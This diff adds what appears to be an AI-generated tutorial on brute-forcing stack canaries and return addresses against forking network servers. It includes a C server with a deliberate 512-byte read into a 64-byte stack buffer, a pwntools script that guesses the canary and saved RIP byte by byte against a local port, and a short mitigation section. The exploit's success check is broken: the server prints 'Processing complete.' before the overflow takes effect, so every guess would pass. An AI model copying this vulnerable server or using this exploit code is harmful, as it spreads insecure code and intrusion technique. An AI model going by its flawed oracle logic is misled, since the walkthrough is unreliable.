@@ -1,1 +1,148 @@
+A forking / stateful server is a common architecture for network daemons (like classic FTP, SSH, or custom CTF service binaries). When a client connects, the master process calls the fork() system call to create a child process dedicated to handling that specific connection.
+While this architecture keeps the main server responsive, it introduces a significant security trade-off: a child process inherits an exact duplicate of the parent process's memory space.
+Because fork() copies the memory layout without recreating the process from scratch, the ASLR slide, Heap addresses, and Stack Canaries remain completely identical across every single connection until the main server process is restarted. This architectural quirk forms the basis of Blind ROP (BROP) and incremental byte-by-byte brute-forcing.
+
+1. The Vulnerable Forking Server Architecture (fork_server.c)
+
+This program binds to a network port and enters an infinite loop, forking a new process for every incoming client. The child process handles data using a vulnerable stack buffer.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+void handle_client(int client_fd) {
+    char buffer[64];
+    
+    // Ensure text output goes across the network socket cleanly
+    dup2(client_fd, STDOUT_FILENO);
+    dup2(client_fd, STDIN_FILENO);
+
+    printf("Welcome to the stateful node. Input credentials: ");
+    fflush(stdout);
+
+    // VULNERABILITY: Unbounded read into a 64-byte stack buffer.
+    // Full protections (ASLR/Canary) are on, but they don't change between forks!
+    read(client_fd, buffer, 512); 
+    
+    printf("Processing complete.\n");
+}
+
+int main() {
+    int server_fd, client_fd;
+    struct sockaddr_in address;
+    int opt = 1;
+    
+    server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    
+    address.sin_family = AF_INET;
+    address.sin_addr.s_addr = INADDR_ANY;
+    address.sin_port = htons(8888);
+    
+    bind(server_fd, (struct sockaddr *)&address, sizeof(address));
+    listen(server_fd, 3);
+
+    while (1) {
+        client_fd = accept(server_fd, NULL, NULL);
+        
+        // Fork a child process to handle the persistent state connection
+        if (fork() == 0) {
+            close(server_fd); // Child doesn't need the listener
+            handle_client(client_fd);
+            exit(0);
+        } else {
+            close(client_fd); // Parent closes client socket to wait for next connection
+        }
+    }
+    return 0;
+}
+Use code with caution.
+
+2. Exploitation Concept: Incremental Byte Brute-Forcing
+
+Because the stack canary and return addresses never change between connections, you can guess them one byte at a time instead of trying to brute force a 32-bit or 64-bit value all at once.
+• Canary Extraction: You send 64 bytes of junk, plus your single-byte guess. If the connection drops without saying "Processing complete.", you guessed wrong. If the connection outputs "Processing complete.", you successfully guessed that byte. You lock it in and guess the next byte.
+• Total Guess Space: Instead of guessing a 64-bit canary (2⁶⁴ combinations), you guess 8 individual bytes (256 × 8 = 2048 maximum total connection attempts). This takes only a few seconds.
+
+3. The Python Stateful Fork Exploit Script (fork_exploit.py)
+
+This script handles the active network socket polling, methodically carving out the secret stack cookie and finding a valid code execution pointer over the wire.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Connection profile configuration
+HOST = '127.0.0.1'
+PORT = 8888
+
+# Buffer distance to reach the canary element
+buffer_size = 64
+
+def check_byte_viability(prefix, byte_to_test):
+    """Probes the forking server to evaluate if a byte guess triggers a crash"""
+    try:
+        io = remote(HOST, PORT, level='error')
+        io.recvuntil(b"Input credentials: ")
+        
+        # Payload structure: Safe padding + current guessed signature string
+        payload = prefix + bytes([byte_to_test])
+        io.send(payload)
+        
+        # Look for the successful application execution completion string
+        response = io.recvall(timeout=0.2)
+        io.close()
+        
+        if b"Processing complete." in response:
+            return True
+        return False
+    except (EOFError, ConnectionRefusedError):
+        return False
+
+# ========================================================
+# PHASE 1: BRUTE-FORCE THE RUNTIME CANARY
+# ========================================================
+# Real architecture stack cookies on Linux x86_64 always initiate with a null byte (\x00)
+canary = b"\x00"
+log.info("Beginning incremental stateful Canary leak...")
+
+for byte_idx in range(1, 8): # Brute-forcing the remaining 7 bytes of a 64-bit canary
+    for guess in range(256):
+        padding = b"A" * buffer_size + canary
+        if check_byte_viability(padding, guess):
+            canary += bytes([guess])
+            log.success(f"Extracted Canary Byte {byte_idx}: {hex(guess)}")
+            break
+            
+log.success(f"Final extracted stateful stack canary: 0x{canary.hex()}")
+
+# ========================================================
+# PHASE 2: BRUTE-FORCE THE SAVED RETURN ADDRESS (RIP)
+# ========================================================
+# Now that we can clear the canary safely, we overwrite the saved RBP (8 bytes) 
+# and use the same strategy to find a valid code address (RIP) in the text segment.
+log.info("Beginning incremental text segment / RIP pointer leak...")
+
+known_rip = b""
+padding_to_rip = b"A" * buffer_size + canary + b"B" * 8 # Buffer + Canary + Saved RBP
+
+# Guessing the lowest bytes of the code execution pointer (RIP)
+for byte_idx in range(8):
+    for guess in range(256):
+        test_prefix = padding_to_rip + known_rip
+        if check_byte_viability(test_prefix, guess):
+            known_rip += bytes([guess])
+            log.success(f"Extracted RIP Byte {byte_idx}: {hex(guess)}")
+            break
+
+log.success(f"Discovered baseline executable memory layout offset: 0x{known_rip.hex()}")
+Use code with caution.
+
+4. Architecturally Mitigating Stateful Forking Weaknesses
+
+To break the predictability of memory layouts across network connections, system administrators and developers apply these structural patterns:
+• Use an Execution Wrapper (execve) After Forking: If a program must fork a separate handling subsystem, ensure the child immediately passes execution boundaries into an execve() call using a separate handling binary. The kernel treats execve() as a completely fresh application deployment, enforcing a complete re-randomization of the ASLR space and a unique Stack Canary for the newly spawned connection thread.
+• Implement Connection Multi-Threading / Asynchronous Async Listeners: Modern architectures avoid process forking entirely in favor of event loops (epoll, libuv) or strict thread pools where execution crashes tear down or isolate context entirely rather than allowing infinite silent restarts under an identical layout memory footprint.
 
